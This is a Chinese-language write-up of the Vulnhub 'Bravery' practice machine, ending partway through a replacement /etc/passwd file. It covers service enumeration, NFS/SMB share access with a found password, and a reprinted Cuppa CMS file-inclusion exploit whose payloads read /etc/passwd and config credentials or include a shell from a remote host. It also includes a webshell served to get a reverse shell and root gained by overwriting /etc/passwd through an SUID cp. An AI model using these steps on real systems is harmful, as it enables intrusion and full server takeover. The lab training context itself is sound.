---
title: Vulnhub-bravery
date: 2024-03-23  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/bravery.html"
---

# DigitalWorld.Local:Bravery

![image-20240322164505765](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906922.png)

有史以来在`vulnhub`下的最大的靶场了，害！

![image-20240322165102866](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906923.png)

新建一个虚拟机，将`iso`和硬盘添加进去，但是会出奇奇怪怪的错误，尝试使用`virtualbox`进行打靶吧。（屈服.jpg）

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906924.png" alt="image-20240322172624212" style="zoom:50%;" />

扫描一下，看看对不对：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906925.png" alt="image-20240322172717396" style="zoom: 33%;" />

大概率没错了，可以开始攻击了。

## 信息搜集

### 端口扫描

```bash
rustscan -a 10.0.2.9 -- -A -sC -sV -sT -T4 
```

```php
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0YSAbz4uaFpvXMZ/Kk+NPx+Y6iCQ32DAtnRkdKL3hvPvDPjFFHhPl/9qaZV5TQ9B2AoJ6mSph9ltbwzfbmgEhAvc0jv6GIDCCSt/hxWDN4XoZZnQVq1ogaGciqTSAFEZZmE00owu5kagXeW15QfLIct4cX5iT69/I8yIAkTTbtyUwguK9bYC/kYn0Kcc5ffwsXPvCkNz+/VlXTD5+2ffZMKlmCdgK33fkMAxReUDUM6+vC1zfHiv38ExbPD66Jgr3R9xvIGDFumNrjhpshm1c3/eae0iTUOq6e7S5/wA7ju5903aSBNjU3bg8sRk4EogicrgMWcQ7GiaW0BxTS/HV
|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBDaEKUrMdgVvi1VuxIpXl8ky9NWDdJxdMJVZMaK2Vu+lPVroNrfzRpHNyIMF2qZPnP7g+DbKqDUfKt85aKQ+iA=
|   256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINYfh4cM3l7YBnp8TjyBDgDOp5vghlVHGsIbZwdSldTT
53/tcp    open  domain      syn-ack dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http        syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
| http-methods: 
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      37015/udp6  nlockmgr
|   100021  1,3,4      37641/tcp6  nlockmgr
|   100021  1,3,4      43969/tcp   nlockmgr
|   100021  1,3,4      58081/udp   nlockmgr
|   100024  1          33855/tcp6  status
|   100024  1          36324/udp   status
|   100024  1          37262/udp6  status
|   100024  1          52420/tcp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp   open  ssl/http    syn-ack Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-06-10T15:53:25
| Not valid after:  2019-06-10T15:53:25
| MD5:   0fa7:c8d5:15ec:c28f:e37a:df78:dcf6:b49f
| SHA-1: 1c6d:ee6d:1ab8:06c0:a8bf:da93:2a6f:f0f1:b758:5284
| -----BEGIN CERTIFICATE-----
| MIIEDjCCAvagAwIBAgICGhEwDQYJKoZIhvcNAQELBQAwgbsxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MR4wHAYDVQQDDBVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B
| CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE4MDYxMDE1NTMyNVoX
| DTE5MDYxMDE1NTMyNVowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIDAlTb21lU3Rh
| dGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQKDBBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDDBVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr1yF
| K207RnQKZQHi1Y19N0itNM9ifUPoYwWJnxwXdgTk0CURDteNoY7pSoY83sZ8TS/V
| 58KawoWMF3nZpzjhqS6MFKUgzVquc+L1M2bIzhlwtSj5x4AdzjhrZlh74bflR8sd
| fdmxECPb899mjm/ocgRichQwqMn8b9wysoFjQJlPbke5WalunHS3Xx+IFIi4xs3E
| 33sKlUU1FTN5Ho3Ve6shZ2Gjs6diKfdeQo+L87YB66dMaFJXwWzVB9LpFzuhOukC
| qjoo8HDOoH/j69ATqu/hJSFZremv3Tur+k7jYrpSjBuls2BNa+656HrZaJ+kUyCA
| UAMMx1NppbhTOkaNsQIDAQABoxowGDAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF4DAN
| BgkqhkiG9w0BAQsFAAOCAQEABfcnoyYjzMDBxQhPys4NoE8SnNzq8xatrKRpRjh9
| I6Ipdl7/GY2v7FK+h7vQLB92vl6uJ2PiFRdjWYy8y9cgLlNoh84Jq2BegmcEFhzF
| robOXjxgbluKIL1q/0WQQ3rDRvz/dGjQvBt/CDXQyFUFQ24eyGOQNFSR8ovopJOj
| l77vsPID4za7cQfmRvRPbI8HfQBwk/VqFNAxL/ni9WtwO7P6UrBHEtsgSyXGD3Io
| mTFEAQxZ5nnCggx81Q/5SWMGDdmfavaKtKpa8WCmfTXTZJxSBuD9ktDxSLvw1vvW
| GuHeg0BoUBX3xIoNVMPgoFnDgiSjc0jgb4KjODz6A+p6JQ==
|_-----END CERTIFICATE-----
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.7.1 (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     syn-ack 3 (RPC #100227)
3306/tcp  open  mysql       syn-ack MariaDB (unauthorized)
8080/tcp  open  http        syn-ack nginx 1.12.2
| http-robots.txt: 4 disallowed entries 
|_/cgi-bin/ /qwertyuiop.html /private /public
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.12.2
|_http-title: Welcome to Bravery! This is SPARTA!
20048/tcp open  mountd      syn-ack 1-3 (RPC #100005)
43969/tcp open  nlockmgr    syn-ack 1-4 (RPC #100021)
52420/tcp open  status      syn-ack 1 (RPC #100024)
Service Info: Host: BRAVERY

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22512/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19413/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44857/udp): CLEAN (Failed to receive data)
|   Check 4 (port 21337/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: BRAVERY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BRAVERY<00>          Flags: <unique><active>
|   BRAVERY<03>          Flags: <unique><active>
|   BRAVERY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb2-time: 
|   date: 2024-03-22T09:28:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.1)
|   Computer name: localhost
|   NetBIOS computer name: BRAVERY\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2024-03-22T05:28:47-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### 目录扫描

开启了`80`端口和`8080`端口，看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906926.png" alt="image-20240322173052271" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906927.png" alt="image-20240322173111381" style="zoom:25%;" />

```bash
feroxbuster -u http://10.0.2.9
```

```text
301      GET        7l       20w      232c http://10.0.2.9/uploads => http://10.0.2.9/uploads/
200      GET       28l      100w     7010c http://10.0.2.9/images/poweredby.png
200      GET        6l       51w     3487c http://10.0.2.9/images/apache_pb.gif
200      GET      132l      307w     5081c http://10.0.2.9/noindex/css/open-sans.css
200      GET        1l        7w       79c http://10.0.2.9/about
200      GET        1l        1w        2c http://10.0.2.9/1
200      GET        1l        1w        2c http://10.0.2.9/9
200      GET        1l        1w        2c http://10.0.2.9/7
200      GET        1l        1w        2c http://10.0.2.9/5
200      GET        1l        1w        2c http://10.0.2.9/2
200      GET        1l        1w        2c http://10.0.2.9/3
200      GET        1l        6w       30c http://10.0.2.9/8
200      GET        1l        5w       27c http://10.0.2.9/contactus
200      GET        1l        1w        2c http://10.0.2.9/4
200      GET        1l        1w        2c http://10.0.2.9/0
200      GET        1l        1w        2c http://10.0.2.9/6
200      GET        7l      340w    19341c http://10.0.2.9/noindex/css/bootstrap.min.css
403      GET      120l      540w     4897c http://10.0.2.9/
```

为了方便主机访问我临时改了一下桥接：新IP`10.160.86.46`

```bash
dirb http://10.160.86.46:8080/
```

```text
---- Scanning URL: http://10.160.86.46:8080/ ----
+ http://10.160.86.46:8080/about (CODE:200|SIZE:503)                                                                  
+ http://10.160.86.46:8080/index.html (CODE:200|SIZE:2637)                                                            
==> DIRECTORY: http://10.160.86.46:8080/private/                                                                      
==> DIRECTORY: http://10.160.86.46:8080/public/                                                                       
+ http://10.160.86.46:8080/robots.txt (CODE:200|SIZE:103)                                                             
                                                                                                                      
---- Entering directory: http://10.160.86.46:8080/private/ ----
(!) WARNING: All responses for this directory seem to be CODE = 403.                                                  
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                      
---- Entering directory: http://10.160.86.46:8080/public/ ----
==> DIRECTORY: http://10.160.86.46:8080/public/css/                                                                   
==> DIRECTORY: http://10.160.86.46:8080/public/fonts/                                                                 
==> DIRECTORY: http://10.160.86.46:8080/public/img/                                                                   
+ http://10.160.86.46:8080/public/index.html (CODE:200|SIZE:22963)                                                    
==> DIRECTORY: http://10.160.86.46:8080/public/js/                                                                    
                                                                                                                      
---- Entering directory: http://10.160.86.46:8080/public/css/ ----
==> DIRECTORY: http://10.160.86.46:8080/public/css/theme/                                                             
                                                                                                                      
---- Entering directory: http://10.160.86.46:8080/public/fonts/ ----
                                                                                                                      
---- Entering directory: http://10.160.86.46:8080/public/img/ ----
==> DIRECTORY: http://10.160.86.46:8080/public/img/elements/                                                          
                                                                                                                      
---- Entering directory: http://10.160.86.46:8080/public/js/ ----
==> DIRECTORY: http://10.160.86.46:8080/public/js/vendor/                                                             

---- Entering directory: http://10.160.86.46:8080/public/css/theme/ ----
---- Entering directory: http://10.160.86.46:8080/public/img/elements/ ----
---- Entering directory: http://10.160.86.46:8080/public/js/vendor/ ----
```

## 漏洞挖掘

### 查看敏感目录

```php
// http://10.160.86.46:8080/robots.txt
User-agent: *
Disallow: /cgi-bin/
Disallow: /qwertyuiop.html
Disallow: /private
Disallow: /public
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906928.png" alt="image-20240322175055501" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906929.png" alt="image-20240322175120401" style="zoom:33%;" />

没有发现啥，看一下`uploads`，只有一个东西：

```text
http://10.160.86.46/uploads/files/internal/department/procurement/sara/note.txt
Remind gen to set up my cuppaCMS account.
```

似乎是`cuppaCMS`建的。

### 访问部分端口

发现开启了`NFS`和`smb`服务，尝试连接一下：

#### NFS服务

```bash
showmount -e 10.160.86.46
# Export list for 10.160.86.46:
# /var/nfsshare *
mount 10.160.86.46:/var/nfsshare /home/kali/temp/tempnfs
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906930.png" alt="image-20240322175927266" style="zoom: 33%;" />

查看相关内容：

```bash
ls -la
# total 28
# drwxrwxrwx 3 nobody nogroup  146 Dec 26  2018 .
# drwxr-xr-x 4 kali   kali    4096 Mar 22 05:56 ..
# -rw-r--r-- 1 root   root      29 Dec 26  2018 discovery
# -rw-r--r-- 1 root   root      51 Dec 26  2018 enumeration
# -rw-r--r-- 1 root   root      20 Dec 26  2018 explore
# drwxr-xr-x 2 root   root      19 Dec 26  2018 itinerary
# -rw-r--r-- 1 root   root     104 Dec 26  2018 password.txt
# -rw-r--r-- 1 root   root      67 Dec 26  2018 qwertyuioplkjhgfdsazxcvbnm
# -rw-r--r-- 1 root   root      15 Dec 26  2018 README.txt
                                                                                                                       
file *                              
# discovery:                  ASCII text
# enumeration:                ASCII text
# explore:                    ASCII text
# itinerary:                  directory
# password.txt:               ASCII text
# qwertyuioplkjhgfdsazxcvbnm: ASCII text
# README.txt:                 ASCII text
                                                                                                                       
cat discovery             
# Remember to LOOK AROUND YOU!
                                                                                                                       
cat enumeration
# Enumeration is at the heart of a penetration test!
                                                                                                                       
cat explore    
# Exploration is fun!
                                                                                                                       
cat password.txt
# Passwords should not be stored in clear-text, written in post-its or written on files on the hard disk!
                                                                                                                       
cat qwertyuioplkjhgfdsazxcvbnm
# Sometimes, the answer you seek may be right before your very eyes.
                                                                                                                       
cat README.txt                
# read me first!
                                                                                                                       
cd itinerary              
                                                                                                                       
ls -la
# total 4
# drwxr-xr-x 2 root   root      19 Dec 26  2018 .
# drwxrwxrwx 3 nobody nogroup  146 Dec 26  2018 ..
# -rw-r--r-- 1 root   root    1733 Dec 26  2018 david
                                                                                                                       
cat david     
# David will need to fly to various cities for various conferences. Here is his schedule.

# 1 January 2019 (Tuesday):
# New Year's Day. Spend time with family.

# 2 January 2019 (Wednesday): 
# 0900: Depart for airport.
# 0945: Check in at Changi Airport, Terminal 3.
# 1355 - 2030 hrs (FRA time): Board flight (SQ326) and land in Frankfurt.
# 2230: Check into hotel.

# 3 January 2019 (Thursday):
# 0800: Leave hotel.
# 0900 - 1700: Attend the Banking and Enterprise Conference.
# 1730 - 2130: Private reception with the Chancellor.
# 2230: Retire in hotel.

# 4 January 2019 (Friday):
# 0800: Check out from hotel.
# 0900: Check in at Frankfurt Main.
# 1305 - 1355: Board flight (LH1190) and land in Zurich.
# 1600 - 1900: Dinner reception
# 2000: Check into hotel.

# 5 January 2019 (Saturday):
# 0800: Leave hotel.
# 0930 - 1230: Visit University of Zurich.
# 1300 - 1400: Working lunch with Mr. Pandelson
# 1430 - 1730: Dialogue with students at the University of Zurich.
# 1800 - 2100: Working dinner with Mr. Robert James Miller and wife.
# 2200: Check into hotel.

# 6 January 2019 (Sunday):
# 0730: Leave hotel.
# 0800 - 1100: Give a lecture on Software Security and Design at the University of Zurich.
# 1130: Check in at Zurich.
# 1715 - 2025: Board flight (LX18) and land in Newark.
# 2230: Check into hotel.

# 7 January 2019 (Monday):
# 0800: Leave hotel.
# 0900 - 1200: Visit Goldman Sachs HQ
# 1230 - 1330: Working lunch with Bill de Blasio
# 1400 - 1700: Visit McKinsey HQ
# 1730 - 1830: Visit World Trade Center Memorial
# 2030: Return to hotel.

# 8 January 2019 (Tuesday):
# 0630: Check out from hotel.
# 0730: Check in at Newark.
# 0945 - 1715 (+1): Board flight (SQ21)

# 9 January 2019 (Wednesday):
# 1715: Land in Singapore.
# 1815 - 2015: Dinner with wife.
# 2100: Clear local emails and head to bed.
```

看想去是个日记，倒是出现了很多的人名，而且得到了一个看上去很像密码的字符串`qwertyuioplkjhgfdsazxcvbnm`。

#### smb服务

使用`enum4linux`探测一下：

```bash
enum4linux 10.160.86.46
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906932.png" alt="image-20240322180627573" style="zoom: 33%;" />

```apl
david
risk

anonymous
secured
```

尝试连接一下，密码使用`qwertyuioplkjhgfdsazxcvbnm`看看有啥信息：

```bash
smbclient //10.160.86.46/anonymous
```

提取不到信息，只能看到很多个文件夹。

```bash
smbclient //10.160.86.46/secured
```

```text
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```

额，没有权限，嘶。如果密码没有问题的话，应该是用户名出错了，尝试使用`david`和`risk`进行登录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906933.png" alt="image-20240322181921519" style="zoom: 33%;" />

下载下来的文件，瞅瞅：

```text
// David.txt
I have concerns over how the developers are designing their webpage. The use of "developmentsecretpage" is too long and unwieldy. We should cut short the addresses in our local domain.
1. Reminder to tell Patrick to replace "developmentsecretpage" with "devops".
2. Request the intern to adjust her Favourites to http://<developmentIPandport>/devops/directortestpagev1.php.
```

```text
// genevieve.txt
Hi! This is Genevieve!
We are still trying to construct our department's IT infrastructure; it's been proving painful so far.
If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:
a) File-share to our director.
b) Setting up our CMS.
c) Requesting for a HIDS solution to secure our host.
```

```text
// README.txt   
README FOR THE USE OF THE BRAVERY MACHINE:
Your use of the BRAVERY machine is subject to the following conditions:
1. You are a permanent staff in Good Tech Inc.
2. Your rank is HEAD and above.
3. You have obtained your BRAVERY badges.
For more enquiries, please log into the CMS using the correct magic word: goodtech.
```

查看一下他们的网页 http://192.168.254.155/genevieve

要改为我们电脑上靶机的IP地址：http://10.160.86.46/genevieve

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906934.png" alt="image-20240322182359454" style="zoom:50%;" />

随便翻一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906935.png" alt="image-20240322182549346" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906936.png" alt="image-20240322182623021" style="zoom:50%;" />

在这里点击一下，进入后台：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906937.png" alt="image-20240322183024654" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906938.png" alt="image-20240322183035528" style="zoom:50%;" />

### 寻找漏洞

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906939.png" alt="image-20240322184240964" style="zoom:50%;" />

有一个文件包含漏洞，瞅瞅：

```php
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "Db@dmin";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        }
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
```

好家伙，`RFI`和`LFI`都有！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906940.png" alt="image-20240322184821441" style="zoom:50%;" />

### 漏洞利用

```bash
python3 -m http.server 8888

nc -lvnp 1234

http://10.160.86.46/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.160.78.86:8888/webshell.php
```

但是没成功：

```bash
http://10.160.86.46/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://10.160.78.86:8888/webshell.txt
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906941.png" alt="image-20240322185556613" style="zoom: 50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403221906942.png" alt="image-20240322185610803" style="zoom: 33%;" />

成功了！

## 提权

### 信息搜集

```bash
find / -perm -u=s -type f 2>/dev/null
/usr/bin/cp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/Xorg
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/bin/ksu
/usr/bin/at
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/flatpak-bwrap
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/selinux_child
/usr/libexec/sssd/proxy_child
/usr/libexec/qemu-bridge-helper
/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
```

`cp`有suid明显可以进行利用，首先想到的就是覆盖`passwd`文件，创建一个root用户：

```bash
hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/bin/bash
```

这是昨天刚搞的，可以使用`openssl passwd -1 -salt hack hack`生成的，本地创建一个`passwd`文件，然后传过去：

```text
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
david:x:1000:1000:david:/home/david:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
geoclue:x:997:995:User for geoclue:/var/lib/geoclue:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
libstoragemgmt:x:995:991:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
gluster:x:994:990:GlusterFS daemons:/var/run/gluster:/sbin/nologin
unbound:x:993:989:Unbound DNS resolver:/etc/unbound:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
